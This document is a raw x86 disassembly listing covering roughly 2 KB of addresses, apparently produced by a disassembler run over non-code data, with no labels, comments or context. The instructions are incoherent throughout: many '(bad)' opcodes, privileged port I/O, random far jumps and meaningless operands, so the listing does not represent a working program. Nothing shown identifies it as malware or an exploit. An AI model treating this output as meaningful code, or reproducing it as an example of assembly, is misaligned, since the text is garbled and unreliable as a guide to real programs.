  4173f8:	retf   0x6893
  4173fb:	mov    dl,0xff
  4173fd:	or     cl,ch
  4173ff:	inc    esi
  417400:	cmp    DWORD PTR [eax+0x37],esi
  417403:	sbb    DWORD PTR [ebx+0x42fd2138],edx
  417409:	jb     0x4173e3
  41740b:	sar    BYTE PTR [eax+eiz*8+0x2805e4dc],cl
  417412:	xor    al,0xcf
  417414:	ret    
  417415:	lock gs push 0xe6591beb
  41741c:	sub    ch,bl
  41741e:	cdq    
  41741f:	(bad)  
  417420:	stos   DWORD PTR es:[edi],eax
  417421:	push   ds
  417422:	jnp    0x4173e9
  417424:	pop    edx
  417425:	inc    ebx
  417426:	lahf   
  417427:	ins    BYTE PTR es:[edi],dx
  417428:	jo     0x41744a
  41742a:	jmp    0x417440
  41742c:	in     al,dx
  41742d:	outs   dx,DWORD PTR ds:[esi]
  41742e:	mov    al,ds:0x9bebf1c5
  417433:	mov    dl,BYTE PTR [ecx-0x52]
  417436:	mov    eax,ds:0xb6a40447
  41743b:	imul   ebp,DWORD PTR [edx],0xe369abaa
  417441:	scas   al,BYTE PTR es:[edi]
  417442:	scas   eax,DWORD PTR es:[edi]
  417443:	or     eax,0x13b0db50
  417448:	pushf  
  417449:	lods   eax,DWORD PTR ds:[esi]
  41744a:	sbb    al,0x40
  41744c:	mov    dh,0x75
  41744e:	jns    0x417480
  417450:	ss (bad) 
  417452:	out    dx,eax
  417453:	xor    BYTE PTR [edx+0x4d5547c1],0xae
  41745a:	sbb    al,bh
  41745c:	jle    0x4174be
  41745e:	and    eax,0xe8617f5f
  417463:	lods   al,BYTE PTR ds:[esi]
  417464:	xchg   ebp,eax
  417465:	imul   esp,DWORD PTR [edx],0x87f52c14
  41746b:	mov    ch,0x97
  41746d:	mov    BYTE PTR [ecx],dh
  41746f:	sub    al,0xfb
  417471:	ja     0x41747f
  417473:	jmp    0x1ed2:0x1252d5ea
  41747a:	jns    0x41740c
  41747c:	xchg   esi,eax
  41747d:	xchg   ecx,eax
  41747e:	stc    
  41747f:	adc    DWORD PTR [eax-0x11474603],eax
  417485:	xchg   edx,eax
  417486:	add    al,0xd5
  417488:	test   al,0xea
  41748a:	push   eax
  41748b:	push   ebp
  41748c:	rcr    BYTE PTR [ecx],0xab
  41748f:	repnz xchg esi,eax
  417491:	add    bh,al
  417493:	cmc    
  417494:	pop    esp
  417495:	jge    0x4174c7
  417497:	lahf   
  417498:	mov    esi,0xd3c87bbc
  41749d:	hlt    
  41749e:	mov    al,0xe6
  4174a0:	mov    esp,0x6971e39c
  4174a5:	add    al,0x87
  4174a7:	out    0xfe,al
  4174a9:	sbb    BYTE PTR [edi-0x76fefd67],al
  4174af:	test   eax,0xb211380b
  4174b4:	pop    ds
  4174b5:	or     eax,0x54eefe15
  4174ba:	pop    edx
  4174bb:	lds    eax,FWORD PTR [eax]
  4174bd:	ds push ecx
  4174bf:	jno    0x4174b3
  4174c1:	scas   al,BYTE PTR es:[edi]
  4174c2:	xchg   edi,eax
  4174c3:	xor    bh,BYTE PTR [edi+0x2a2c1ec3]
  4174c9:	mov    bh,0xd7
  4174cb:	mov    edx,0x48786137
  4174d0:	add    edi,DWORD PTR [edx-0x115bad3c]
  4174d6:	pop    edi
  4174d7:	pushf  
  4174d8:	mov    BYTE PTR [eax+eiz*8-0x1208db48],ah
  4174df:	adc    BYTE PTR [ecx],0xbe
  4174e2:	mov    eax,0x67ad7969
  4174e7:	test   DWORD PTR [ecx-0x64],esp
  4174ea:	out    0x59,al
  4174ec:	mov    bh,0x9d
  4174ee:	mov    DWORD PTR [edi-0x62],esp
  4174f1:	(bad)  
  4174f2:	in     eax,0x50
  4174f4:	jmp    0x2f425a2f
  4174f9:	sub    DWORD PTR [edx],ecx
  4174fb:	(bad)  
  4174fc:	jp     0x417513
  4174fe:	mov    DWORD PTR [esi-0xb],edx
  417501:	dec    eax
  417502:	retf   
  417503:	xchg   edx,eax
  417504:	mov    esp,0xc449dd47
  417509:	(bad)
  41750d:	xor    ah,cl
  41750f:	std    
  417510:	outs   dx,DWORD PTR cs:[esi]
  417512:	xchg   BYTE PTR [edi-0x24],bh
  417515:	nop
  417516:	xchg   ebx,eax
  417517:	fs jp  0x4174d5
  41751a:	out    dx,al
  41751b:	retf   0x34b3
  41751e:	xchg   esi,eax
  41751f:	loope  0x4174a7
  417521:	push   es
  417522:	or     DWORD PTR [edx],ecx
  417524:	pushf  
  417525:	mov    ds:0xe8243c50,eax
  41752a:	test   DWORD PTR [eax+0x4ddd130c],ecx
  417530:	ror    DWORD PTR [edi],1
  417532:	(bad)  [eax]
  417534:	call   0x864b1bfa
  417539:	pop    ebx
  41753a:	outs   dx,DWORD PTR ds:[esi]
  41753b:	cdq    
  41753c:	nop
  41753d:	or     al,0x8d
  41753f:	xor    bl,dh
  417541:	ret    0x31f4
  417544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417545:	out    0xce,eax
  417547:	ss jb  0x41754e
  41754a:	add    edi,0x5e8b64f8
  417550:	ins    BYTE PTR es:[edi],dx
  417551:	sub    eax,0x963f8485
  417556:	push   ecx
  417557:	or     eax,edx
  417559:	(bad)  
  41755a:	inc    esp
  41755b:	pusha  
  41755c:	sbb    al,0x0
  41755e:	outs   dx,DWORD PTR ds:[esi]
  41755f:	fldenv [eax]
  417561:	xor    bh,dh
  417563:	add    BYTE PTR [edi],0xd8
  417566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417567:	(bad)
  41756a:	shl    DWORD PTR [edx+0x45],1
  41756d:	xchg   ebp,eax
  41756e:	push   es
  41756f:	jb     0x4175d5
  417571:	jae    0x417528
  417573:	cli    
  417574:	xchg   esi,eax
  417575:	mul    ebp
  417577:	fidiv  DWORD PTR [ebx-0x6ec3d49b]
  41757d:	ins    BYTE PTR es:[edi],dx
  41757e:	jo     0x417545
  417580:	jbe    0x4175ab
  417582:	sub    ch,BYTE PTR [ecx+0x3ce83152]
  417588:	dec    ecx
  417589:	mov    dl,0xa7
  41758b:	or     eax,0x1bd7352c
  417590:	div    DWORD PTR [esi+eax*8+0x129984b7]
  417597:	mov    bh,0xee
  417599:	mov    ch,0x5c
  41759b:	and    ecx,DWORD PTR [edi-0xc4c8168]
  4175a1:	clc    
  4175a2:	idiv   esi
  4175a4:	adc    DWORD PTR [ebp-0x22],eax
  4175a7:	sub    BYTE PTR [eax+ebx*8+0x2ab3ff4c],ah
  4175ae:	mov    eax,0xfd46d258
  4175b3:	add    DWORD PTR [ebp-0x93bb6c6],0xb4d4fc9
  4175bd:	jp     0x4175e1
  4175bf:	cs jns 0x4175d1
  4175c2:	and    al,0x5e
  4175c4:	jge    0x41759d
  4175c6:	jne    0x417584
  4175c8:	fist   DWORD PTR [esi+0x41]
  4175cb:	mov    al,0x9a
  4175cd:	or     eax,0x74af8359
  4175d2:	mov    al,0xa
  4175d4:	fsub   QWORD PTR [edi+0x3544ac76]
  4175da:	inc    ebx
  4175db:	loope  0x4175f8
  4175dd:	push   0x53
  4175df:	xor    BYTE PTR [eax+0x58daf399],cl
  4175e5:	xchg   esi,eax
  4175e6:	dec    edi
  4175e7:	sbb    ch,BYTE PTR [ecx-0x41b11724]
  4175ed:	test   eax,0x28cbe5b3
  4175f2:	std    
  4175f3:	lods   eax,DWORD PTR ds:[esi]
  4175f4:	xchg   esp,eax
  4175f5:	jp     0x41766a
  4175f7:	xchg   ebp,edi
  4175f9:	jbe    0x417588
  4175fb:	shr    BYTE PTR [eax],cl
  4175fd:	lock and ecx,DWORD PTR [ebp-0x74dcb73e]
  417604:	and    bh,al
  417606:	push   edi
  417607:	scas   eax,DWORD PTR es:[edi]
  417608:	popa   
  417609:	aam    0xc1
  41760b:	rol    DWORD PTR [ebx+0xb],1
  41760e:	ret    
  41760f:	jae    0x417655
  417611:	outs   dx,DWORD PTR ds:[esi]
  417612:	xor    esi,esi
  417614:	(bad)  
  417615:	popf   
  417616:	pop    esp
  417617:	fsubr  DWORD PTR [ebp+ebx*8+0x68739751]
  41761e:	jge    0x41762e
  417620:	ins    BYTE PTR es:[edi],dx
  417621:	stos   BYTE PTR es:[edi],al
  417622:	int    0x72
  417624:	rcl    BYTE PTR [eax],cl
  417626:	retf   0x1e52
  417629:	ds inc ecx
  41762b:	mov    ds:0x6b12dce2,eax
  417630:	xchg   ebp,eax
  417631:	outs   dx,BYTE PTR ds:[esi]
  417632:	cdq    
  417633:	out    dx,al
  417634:	jmp    FWORD PTR [edx+ebx*8-0x3f]
  417638:	jnp    0x41764e
  41763a:	es jl  0x417649
  41763d:	hlt    
  41763e:	inc    eax
  41763f:	cli    
  417640:	push   edx
  417641:	arpl   WORD PTR [eax+0x9],ax
  417644:	pop    es
  417645:	push   ds
  417646:	jo     0x41764b
  417648:	add    DWORD PTR [ecx],0xfffffffc
  41764b:	out    dx,eax
  41764c:	adc    edx,0x7
  41764f:	fwait
  417650:	std    
  417651:	gs out 0xd9,al
  417654:	sub    dh,bh
  417656:	add    esi,ebx
  417658:	sar    BYTE PTR [eax-0xacbd788],cl
  41765e:	cmp    eax,0x8a876222
  417663:	adc    eax,DWORD PTR [esi-0x601e23f2]
  417669:	mov    eax,ds:0xdd986267
  41766e:	mov    cs,WORD PTR [ecx-0x75]
  417671:	fadd   DWORD PTR [edi]
  417673:	imul   ebx,DWORD PTR [esi+0x66],0xffffffb2
  417677:	mov    BYTE PTR [eax-0x14066d9f],al
  41767d:	push   0xfe07d3d3
  417682:	sbb    edi,DWORD PTR [edi]
  417684:	sub    eax,0x612f5786
  417689:	out    0x3e,al
  41768b:	dec    edi
  41768c:	dec    esi
  41768d:	pop    ds
  41768e:	mov    ds:0x39ce8b9e,al
  417693:	dec    esi
  417694:	xchg   edx,eax
  417695:	(bad)  
  417696:	mov    al,0x27
  417698:	or     ecx,edx
  41769a:	pmaddwd mm5,QWORD PTR [ebx]
  41769d:	jecxz  0x4176d1
  41769f:	outs   dx,DWORD PTR ds:[esi]
  4176a0:	in     eax,dx
  4176a1:	lea    esp,[esi]
  4176a3:	jo     0x4176be
  4176a5:	data16 loop 0x417714
  4176a8:	fild   QWORD PTR ds:0x140848ac
  4176ae:	xor    ebx,DWORD PTR [edi-0x67]
  4176b1:	mov    bl,0x40
  4176b3:	shr    BYTE PTR [esi-0x2f571f16],0xd7
  4176ba:	push   es
  4176bb:	mov    edi,0x1966f86b
  4176c0:	adc    BYTE PTR [edx-0x17f5b511],ch
  4176c6:	dec    ebp
  4176c7:	add    dl,BYTE PTR [ebx-0x75]
  4176ca:	add    al,0x7a
  4176cc:	sbb    al,0x74
  4176ce:	add    ecx,0x7c
  4176d1:	(bad)
  4176d5:	mov    ds:0x9f84720e,eax
  4176da:	mov    edx,0x4c4721dd
  4176df:	dec    edx
  4176e0:	test   al,0x1f
  4176e2:	adc    eax,0x1aa8362f
  4176e7:	stc    
  4176e8:	and    edi,0xffffffd2
  4176eb:	jl     0x417716
  4176ed:	add    DWORD PTR [ebp-0x7a5dfcc8],ebx
  4176f3:	dec    ebx
  4176f4:	daa    
  4176f5:	mov    ebx,0xe9b61320
  4176fa:	test   DWORD PTR [edi+0x4c],edx
  4176fd:	jne    0x417761
  4176ff:	ret    
  417700:	fdiv   st,st(2)
  417702:	xor    esi,ecx
  417704:	call   0xb80b:0xfa452495
  41770b:	sti    
  41770c:	repz pop eax
  41770e:	push   esp
  41770f:	jae    0x4176fc
  417711:	mov    edi,0xeec05f8f
  417716:	fld    QWORD PTR [eax]
  417718:	ss test al,0xf6
  41771b:	xor    DWORD PTR ds:0xc87dd9b8,esp
  417721:	cmp    DWORD PTR [ecx],ebp
  417723:	ds push ebx
  417725:	adc    DWORD PTR [edx+0x3b],ebx
  417728:	je     0x417710
  41772a:	fdivr  DWORD PTR [edi+ecx*1+0x3374c1aa]
  417731:	shl    BYTE PTR [edx+0x51],1
  417734:	nop
  417735:	xchg   esp,eax
  417736:	fdivrp st(3),st
  417738:	ret    
  417739:	xchg   esi,eax
  41773a:	fdiv   DWORD PTR [edi]
  41773c:	pop    ss
  41773d:	and    edx,DWORD PTR [esi]
  41773f:	pop    eax
  417740:	dec    BYTE PTR [ecx]
  417742:	cli    
  417743:	sbb    bl,cl
  417745:	sub    DWORD PTR [ebx+0x401d9662],ecx
  41774b:	pop    ebx
  41774c:	sbb    DWORD PTR [ebp-0x301dbbf0],edi
  417752:	cli    
  417753:	test   eax,0xe4f0b373
  417758:	add    dl,ah
  41775a:	sbb    BYTE PTR [edi-0x6e0e2ab3],dl
  417760:	sbb    eax,0x67abf6ee
  417765:	neg    DWORD PTR cs:[edx+0x2a5dc678]
  41776c:	call   0xdbee:0x43cd9434
  417773:	push   0x324e090f
  417778:	sub    esp,DWORD PTR [esi+0x48]
  41777b:	push   ebx
  41777c:	or     BYTE PTR [eax-0x3b],cl
  41777f:	jle    0x417786
  417781:	mov    ch,0xfd
  417783:	and    al,0xe3
  417785:	mov    eax,esp
  417787:	and    eax,0x84cf92
  41778c:	xchg   edx,eax
  41778d:	popa   
  41778e:	adc    bl,BYTE PTR [edi+0x607ed4b0]
  417794:	jnp    0x417779
  417796:	ficom  DWORD PTR [ebx-0x4c]
  417799:	stos   BYTE PTR es:[edi],al
  41779a:	sub    DWORD PTR [edi],ebp
  41779c:	fwait
  41779d:	pop    edi
  41779e:	adc    BYTE PTR [edx+edx*1],0x73
  4177a2:	add    dl,BYTE PTR [esp+eax*4+0x35c4c408]
  4177a9:	in     al,0x7d
  4177ab:	mov    ecx,ebp
  4177ad:	cmc    
  4177ae:	mov    esp,0x7f71830f
  4177b3:	mov    bh,0x6d
  4177b5:	xor    BYTE PTR [edx],cl
  4177b7:	push   ecx
  4177b8:	pop    edi
  4177b9:	clc    
  4177ba:	and    BYTE PTR [ebp-0x61],0x39
  4177be:	mov    cl,0x8e
  4177c0:	scas   eax,DWORD PTR es:[edi]
  4177c1:	sbb    ebp,DWORD PTR [edi]
  4177c3:	jne    0x4177b7
  4177c5:	stos   BYTE PTR es:[edi],al
  4177c6:	jmp    0x4177f4
  4177c8:	jae    0x417782
  4177ca:	push   0xfbabc5d2
  4177cf:	daa    
  4177d0:	xor    dl,BYTE PTR [eax-0x5aa3dc58]
  4177d6:	or     bh,BYTE PTR [ebx]
  4177d8:	fdiv   QWORD PTR [eax-0x3b]
  4177db:	xchg   ebx,eax
  4177dc:	and    edx,DWORD PTR ds:0x464d9682
  4177e2:	push   es
  4177e3:	mov    bl,0xbb
  4177e5:	jo     0x417830
  4177e7:	mov    ebx,0x51e7b6a1
  4177ec:	rol    DWORD PTR [esi-0x4f],cl
  4177ef:	cli    
  4177f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177f1:	or     BYTE PTR [edi-0x36],ch
  4177f4:	scas   eax,DWORD PTR es:[edi]
  4177f5:	push   0xf366c5e
  4177fa:	daa    
  4177fb:	inc    esi
  4177fc:	add    al,0x78
  4177fe:	daa    
  4177ff:	push   0x64
  417801:	(bad)  
  417802:	ficomp WORD PTR [eax+0x20b4576b]
  417808:	pop    edx
  417809:	stos   BYTE PTR es:[edi],al
  41780a:	fwait
  41780b:	ins    BYTE PTR es:[edi],dx
  41780c:	inc    ebp
  41780d:	dec    eax
  41780e:	jle    0x41780d
  417810:	test   al,0xf2
  417812:	call   0xbd53:0xba6586f0
  417819:	stos   BYTE PTR es:[edi],al
  41781a:	mov    ebx,0xe9bd05b
  41781f:	inc    esi
  417820:	aam    0x59
  417822:	jl     0x417839
  417824:	adc    dl,BYTE PTR [esi+eiz*1+0x8d8df04]
  41782b:	lock into 
  41782d:	retf   0x7bd8
  417830:	call   0xf78639d2
  417835:	xor    eax,0x1e858f14
  41783a:	(bad)  
  41783c:	out    dx,eax
  41783d:	xor    al,0x47
  41783f:	jmp    0x4178a1
  417841:	mov    ebx,0x3f923154
  417846:	lods   al,BYTE PTR ds:[esi]
  417847:	outs   dx,DWORD PTR ds:[esi]
  417848:	in     al,0x53
  41784a:	mov    ecx,0x93a0c812
  41784f:	(bad)  
  417850:	adc    al,0x20
  417852:	jmp    0x8d1b:0xe9f0c184
  417859:	push   eax
  41785a:	fld    TBYTE PTR [edx+0x32]
  41785d:	loop   0x417892
  41785f:	cmp    eax,0x5f9e3ce9
  417864:	ss sbb eax,0x3b81da36
  41786a:	fist   WORD PTR [ebp-0x53]
  41786d:	sbb    BYTE PTR [edi+0x6f],dl
  417870:	popa   
  417871:	enter  0x76a7,0xe8
  417875:	sbb    esi,DWORD PTR [eax-0x1c]
  417878:	sahf   
  417879:	and    cl,BYTE PTR [ebp+0x13936d74]
  41787f:	sub    esi,ecx
  417881:	test   BYTE PTR ds:0x40d5e334,dh
  417887:	mov    eax,ds:0x758ae1c7
  41788c:	and    DWORD PTR [esi+0x6852f259],edx
  417892:	mov    ds:0xb13b414a,al
  417897:	inc    edi
  417898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417899:	jmp    0x4178c9
  41789b:	stos   BYTE PTR es:[edi],al
  41789c:	or     eax,0x160ccbb9
  4178a1:	leave  
  4178a2:	ins    BYTE PTR es:[edi],dx
  4178a3:	xchg   esp,eax
  4178a4:	stos   BYTE PTR es:[edi],al
  4178a5:	mov    edx,0x81266096
  4178aa:	shl    ch,cl
  4178ac:	inc    ebp
  4178ad:	xchg   ebx,eax
  4178ae:	and    DWORD PTR [ebx],ecx
  4178b0:	test   BYTE PTR [edx],al
  4178b2:	pop    ds
  4178b3:	add    ebp,DWORD PTR ds:0x524a2439
  4178b9:	cmp    al,0x87
  4178bb:	inc    eax
  4178bc:	lea    esp,[ecx]
  4178be:	outs   dx,DWORD PTR ds:[esi]
  4178bf:	(bad)  [edx]
  4178c1:	adc    ecx,esp
  4178c3:	je     0x41785e
  4178c5:	xchg   ecx,eax
  4178c6:	cli    
  4178c7:	fld    DWORD PTR [esi]
  4178c9:	int    0x19
  4178cb:	pop    esi
  4178cc:	xchg   ebx,eax
  4178cd:	jp     0x417901
  4178cf:	out    0x6a,al
  4178d1:	lods   eax,DWORD PTR ds:[esi]
  4178d2:	mov    ah,0xcf
  4178d4:	xchg   ebx,eax
  4178d5:	push   ebx
  4178d6:	push   ecx
  4178d7:	pushf  
  4178d8:	fcomp  QWORD PTR [esp+edx*4]
  4178db:	push   0x16d0ac17
  4178e0:	retf   0xacca
  4178e3:	sbb    DWORD PTR [ebx+ebx*2],0xffffffa3
  4178e7:	rcl    edx,1
  4178e9:	mov    ecx,0xeef7cc4b
  4178ee:	xor    esp,DWORD PTR [edx-0xe]
  4178f1:	and    eax,0x8ac5b7ad
  4178f6:	mov    ebp,0x922a71f2
  4178fb:	addr16 push edx
  4178fd:	das    
  4178fe:	in     eax,dx
  4178ff:	push   ds
  417900:	xlat   BYTE PTR ds:[ebx]
  417901:	add    dl,dh
  417903:	mov    al,ds:0xfa8788fb
  417908:	in     eax,0x8
  41790a:	mov    al,0x77
  41790c:	or     al,0xde
  41790e:	cmp    bh,BYTE PTR [esi-0x23]
  417911:	fwait
  417912:	shr    BYTE PTR [ecx+ecx*2+0x2d],cl
  417916:	pavgb  mm2,QWORD PTR [edi-0x3809a6f]
  41791d:	dec    esp
  41791e:	mov    eax,ds:0x13cb82eb
  417923:	mov    ds:0xa3233224,eax
  417928:	leave  
  417929:	in     eax,0x34
  41792b:	sub    eax,0x25b2e02e
  417930:	or     DWORD PTR [ebx],esi
  417932:	loop   0x417970
  417934:	test   DWORD PTR [ebx],0x5e91ad82
  41793a:	mov    DWORD PTR [edi],esp
  41793c:	call   0x986e:0x8d9f0cca
  417943:	sub    DWORD PTR cs:[ebp-0x68],ebp
  417947:	pop    esp
  417948:	dec    ebx
  417949:	mov    esi,0x35935581
  41794e:	or     ebp,DWORD PTR [ebp-0x3d]
  417951:	mov    ebx,0x5a52764b
  417956:	in     eax,0xd1
  417958:	mov    ch,0xd5
  41795a:	stc    
  41795b:	nop
  41795c:	lock std 
  41795e:	mov    al,0xb8
  417960:	xor    dl,dh
  417962:	or     eax,0xb9c9216a
  417967:	push   edi
  417968:	ss jmp 0x417934
  41796b:	jl     0x417925
  41796d:	mov    ch,0x7e
  41796f:	repz sbb ah,BYTE PTR [ecx+ecx*2-0x42e3b747]
  417977:	push   esp
  417978:	mov    esp,0xdb4fa7e5
  41797d:	xlat   BYTE PTR ds:[ebx]
  41797e:	sbb    eax,0xb7950fd1
  417983:	and    esi,DWORD PTR [ebp+0x4dcd45a]
  417989:	repnz fiadd DWORD PTR [ebp+0x11]
  41798d:	sbb    bl,al
  41798f:	fiadd  DWORD PTR [ecx+0x6224accf]
  417995:	dec    ebx
  417996:	xchg   DWORD PTR [esi],ebp
  417998:	in     al,dx
  417999:	jbe    0x417a01
  41799b:	mov    ebx,0x67829b07
  4179a0:	ret    0x5017
  4179a3:	in     eax,dx
  4179a4:	div    ecx
  4179a6:	jmp    0x417976
  4179a8:	inc    ecx
  4179a9:	adc    dh,0x4d
  4179ac:	int3   
  4179ad:	in     eax,dx
  4179ae:	js     0x417a05
  4179b0:	or     bh,bl
  4179b2:	jae    0x41799e
  4179b4:	mov    cl,0xdf
  4179b6:	or     esp,DWORD PTR [esi-0x6a1c1882]
  4179bc:	add    BYTE PTR [edi-0x1d225ede],cl
  4179c2:	jge    0x41795c
  4179c4:	icebp  
  4179c5:	sar    BYTE PTR ds:0x71e4a86f,cl
  4179cb:	jnp    0x4179f2
  4179cd:	dec    edx
  4179cf:	lock out dx,al
  4179d1:	sar    BYTE PTR [eax],0x3a
  4179d4:	dec    eax
  4179d5:	sbb    al,BYTE PTR [ebx]
  4179d7:	test   DWORD PTR [ebx],0xce4e920c
  4179dd:	dec    ebx
  4179de:	jle    0x4179da
  4179e0:	sbb    eax,0x9eaa8407
  4179e5:	jmp    0x3849:0xa6ff93e9
  4179ec:	sub    DWORD PTR [esi+0x7b4aea0d],eax
  4179f2:	popf   
  4179f3:	(bad)  
  4179f5:	sbb    eax,0x11a0754c
  4179fa:	sbb    ah,BYTE PTR [ecx+0x32]
  4179fd:	xchg   ecx,eax
  4179fe:	xchg   DWORD PTR [ebx+0x6f668555],ebx
  417a04:	inc    esi
  417a05:	jecxz  0x4179de
  417a07:	out    0x3,al
  417a09:	and    al,0x2a
  417a0b:	push   ebx
  417a0c:	xchg   ecx,eax
  417a0d:	mov    ebp,0xd08bbdf1
  417a12:	sti    
  417a13:	(bad)  
  417a14:	fnstenv [ebx+0x3d]
  417a17:	repz mov esi,DWORD PTR [esi-0x23cd2f9e]
  417a1e:	shl    eax,cl
  417a20:	inc    esp
  417a21:	jl     0x4179b9
  417a23:	jmp    0xa6fe:0x3e600107
  417a2a:	dec    esp
  417a2b:	jb     0x4179d7
  417a2d:	les    ecx,FWORD PTR [ebx]
  417a2f:	cwde   
  417a30:	xchg   edi,eax
  417a31:	rcr    BYTE PTR [ebx-0x2370807d],0x91
  417a38:	in     al,dx
  417a39:	test   eax,0xc99760c
  417a3e:	int3   
  417a3f:	xchg   di,ax
  417a41:	bound  ecx,QWORD PTR [ebp-0x57]
  417a44:	(bad)  
  417a45:	das    
  417a46:	add    BYTE PTR [ebx],al
  417a48:	in     eax,0x3c
  417a4a:	cmp    BYTE PTR [esi+0x43],ah
  417a4d:	nop
  417a4e:	mov    edx,0xc1a999da
  417a53:	jo     0x4179fa
  417a55:	inc    eax
  417a56:	enter  0x2b65,0x2f
  417a5a:	jns    0x417abc
  417a5c:	iret   
  417a5d:	pop    esi
  417a5e:	pop    esp
  417a5f:	mov    ebx,0xc0457363
  417a64:	dec    eax
  417a65:	inc    edi
  417a66:	sbb    DWORD PTR [esi],ebx
  417a68:	mov    WORD PTR [ebp-0x52],ds
  417a6b:	cld    
  417a6c:	xor    eax,0xb3d43c29
  417a71:	les    esi,FWORD PTR [eax-0x88a716b]
  417a77:	xchg   ecx,eax
  417a78:	mov    es,WORD PTR [eax+0x61]
  417a7b:	int    0x9a
  417a7d:	dec    ecx
  417a7e:	pusha  
  417a7f:	jmp    0x571e:0x5d27576d
  417a86:	and    eax,0xe1f17fc9
  417a8b:	int3   
  417a8c:	adc    bh,BYTE PTR [ebx]
  417a8e:	jmp    0x417ac9
  417a90:	arpl   sp,sp
  417a92:	dec    cx
  417a94:	out    0x41,eax
  417a96:	jo     0x417ae2
  417a98:	or     esp,ecx
  417a9a:	fisttp WORD PTR [eax-0x5]
  417a9d:	fsub   QWORD PTR [edi]
  417a9f:	push   eax
  417aa0:	aas    
  417aa1:	ror    BYTE PTR [ebx+0x75ba5533],0x92
  417aa8:	imul   esp,DWORD PTR [edi-0x71880b2b],0x61
  417aaf:	sub    al,0x7f
  417ab1:	jnp    0x417ad8
  417ab3:	cmp    eax,0x5f8b7cbb
  417ab8:	loopne 0x417a88
  417aba:	pop    ds
  417abb:	rcl    DWORD PTR [esi],1
  417abd:	xlat   BYTE PTR ds:[ebx]
  417abe:	xor    al,0x24
  417ac0:	fimul  DWORD PTR [eax]
  417ac2:	fadd   QWORD PTR [esi]
  417ac4:	mov    al,ds:0xf3871fc8
  417ac9:	test   esi,ecx
  417acb:	jb     0x417b00
  417acd:	stos   DWORD PTR es:[edi],eax
  417ace:	mov    ah,0xc9
  417ad0:	jle    0x417ad6
  417ad2:	mov    ds:0x1cd6f260,al
  417ad7:	ret    
  417ad8:	aaa    
  417ad9:	mov    ecx,0x9cbdf4c
  417ade:	jo     0x417a62
  417ae0:	fist   WORD PTR [ebp+edi*2-0x26ca7b79]
  417ae7:	xor    eax,0x67367733
  417aec:	in     al,dx
  417aed:	in     eax,0x39
  417aef:	popa   
  417af0:	icebp  
  417af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417af2:	sub    al,0xb6
  417af4:	fisttp QWORD PTR [esi]
  417af6:	xor    al,0xf2
  417af8:	dec    ecx
  417af9:	into   
  417afa:	call   FWORD PTR [esi+0x4]
  417afd:	xchg   esi,eax
  417afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aff:	lods   al,BYTE PTR ds:[esi]
  417b00:	mov    al,ds:0x379d1c2c
  417b05:	push   esp
  417b06:	mov    WORD PTR [edi+eiz*2+0x508564fa],cs
  417b0d:	fwait
  417b0e:	mov    cl,0x68
  417b10:	inc    edi
  417b11:	pop    esp
  417b12:	push   ebx
  417b13:	iret   
  417b14:	dec    ebp
  417b15:	push   edx
  417b16:	adc    BYTE PTR [eax],cl
  417b18:	pop    ss
  417b19:	push   esi
  417b1a:	int3   
  417b1b:	mov    bl,0x86
  417b1d:	jge    0x417b5a
  417b1f:	iret   
  417b20:	into   
  417b21:	push   ss
  417b22:	adc    DWORD PTR [ebp-0x5ecf065b],ecx
  417b28:	pop    ds
  417b29:	out    dx,al
  417b2a:	add    edx,edi
  417b2c:	jnp    0x417b7e
  417b2e:	outs   dx,BYTE PTR ds:[esi]
  417b2f:	pop    esi
  417b30:	pop    ebx
  417b31:	push   ebp
  417b32:	in     eax,0x55
  417b34:	pop    es
  417b35:	add    ebp,DWORD PTR ds:0x9ae6
  417b3a:	sar    ebx,1
  417b3c:	sti    
  417b3d:	inc    edx
  417b3e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  417b40:	sub    BYTE PTR [ecx+0x602111ba],al
  417b46:	push   ss
  417b47:	add    eax,0x4a9c7589
  417b4c:	loop   0x417b46
  417b4e:	idiv   DWORD PTR [esi+eax*2]
  417b51:	aas    
  417b52:	(bad)  
  417b53:	sti    
  417b54:	out    dx,eax
  417b55:	mov    ch,0x26
  417b57:	ds call 0xbe199c61
  417b5d:	or     al,0x7b
  417b5f:	stc    
  417b60:	push   0xffffffe2
  417b62:	int    0x4a
  417b64:	push   ebp
  417b65:	xor    eax,DWORD PTR [edi-0x78]
  417b68:	sbb    DWORD PTR [ebx+0x5a99f80b],esp
  417b6e:	push   eax
  417b6f:	sbb    DWORD PTR [ecx-0x2fb86d2b],0xffffffa5
  417b76:	xchg   ebp,eax
  417b77:	and    ecx,DWORD PTR [ebx-0x4819aa57]
  417b7d:	push   0x1c041b1c
  417b82:	pop    edi
  417b83:	mov    dh,0x90
  417b85:	jne    0x417be5
  417b87:	or     eax,edx
  417b89:	pushf  
  417b8a:	sbb    al,0xca
  417b8c:	xchg   esp,eax
  417b8d:	jno    0x417b4a
  417b8f:	dec    ebx
  417b90:	pop    eax
  417b91:	mov    esi,0xb06bdca3
  417b96:	inc    ecx
  417b97:	mov    eax,ds:0x1f3b20e9
  417b9c:	adc    DWORD PTR [ebx+0x2d6f9f13],edi
  417ba2:	pop    ds
  417ba3:	rol    BYTE PTR [esi+eiz*4+0x59],cl
  417ba7:	sub    dl,BYTE PTR [ebp-0x4]
  417baa:	es dec ebp
  417bac:	or     al,0x98
  417bae:	or     DWORD PTR [eax+ebx*8+0x5e],edi
  417bb2:	push   ss
  417bb3:	or     al,0xf2
  417bb5:	test   bl,cl
  417bb7:	and    BYTE PTR [esi+0x6ce54f69],dl
  417bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bbe:	icebp  
  417bbf:	je     0x417bd2
  417bc1:	jmp    0xf58c:0xd6e9bd9e
  417bc8:	xchg   edi,eax
  417bc9:	pusha  
  417bca:	cwde   
  417bcb:	xlat   BYTE PTR ds:[ebx]
  417bcc:	fs mov esi,0xf4b10f2c
  417bd2:	add    edx,DWORD PTR [edx-0x29ef0117]
  417bd8:	pop    ds
  417bd9:	aad    0xc3
  417bdb:	jl     0x417bc3
  417bdd:	push   esi
  417bde:	inc    esi
  417bdf:	mov    dl,BYTE PTR [edx]
  417be1:	lds    edx,FWORD PTR [edi]
  417be3:	cld    
  417be4:	(bad)
  417be7:	push   eax
  417be8:	jno    0x417bac
  417bea:	jmp    0x417b8c
  417bec:	in     al,0x20
  417bee:	js     0x417b9c
